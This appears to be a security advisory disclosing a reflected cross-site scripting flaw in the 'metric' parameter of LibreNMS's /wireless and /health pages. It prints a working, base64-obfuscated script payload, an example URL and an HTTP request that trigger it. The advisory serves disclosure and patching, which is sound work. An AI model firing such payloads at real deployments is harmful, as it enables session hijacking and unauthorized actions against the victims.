summary: |
  LibreNMS has a Reflected XSS ('Cross-site Scripting') in librenms/includes/html/pages/wireless.inc.php
  ### Summary
  A Reflected Cross-Site Scripting (XSS) vulnerability in the "metric" parameter of the "/wireless" and "/health" endpoints allows attackers to inject arbitrary JavaScript. This vulnerability results in the execution of malicious code when a user accesses the page with a malicious "metric" parameter, potentially compromising their session and allowing unauthorized actions.

  ### Details
  The "/wireless" and "/health" endpoints are vulnerable to reflected XSS in the "metric" parameter. An attacker can inject the following XSS payload into the "metric" parameter:
  ```<script>constructor['constructor'](atob('Y29uZmlybShkb2N1bWVudC5kb21haW4p'))();<!---->```

  When the page is loaded with this malicious parameter, the script executes immediately. The vulnerability occurs due to improper sanitization of the "metric" parameter in the following sinks:
  https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/html/pages/wireless.inc.php#L82
  https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/html/pages/health.inc.php#L114

  ### PoC
  1. Inject the following payload into the "metric" parameter of the "/wireless" or "/health" endpoint:
  ```<script>constructor['constructor'](atob('Y29uZmlybShkb2N1bWVudC5kb21haW4p'))();<!---->```
  2. Access the page with the injected payload.
  3. Observe that the injected script executes upon loading the page.

  Example URL: ```http://<your_url>/wireless/metric=%3Cscript%3Econstructor['constructor'](atob('Y29uZmlybShkb2N1bWVudC5kb21haW4p'))();%3C!----%3E```

  Example Request:
  ```http
  GET /wireless/metric=%3Cscript%3Econstructor[%27constructor%27](atob(%27Y29uZmlybShkb2N1bWVudC5kb21haW4p%27))();%3C!----%3E HTTP/1.1
  Host: <your_host>
  Cookie: <your cookies>
  ```

  ### Impact

  This vulnerability allows attackers to execute arbitrary JavaScript in the context of a user’s session by crafting a malicious URL. The attack could lead to session hijacking, unauthorized actions, or further exploitation by injecting malicious scripts.
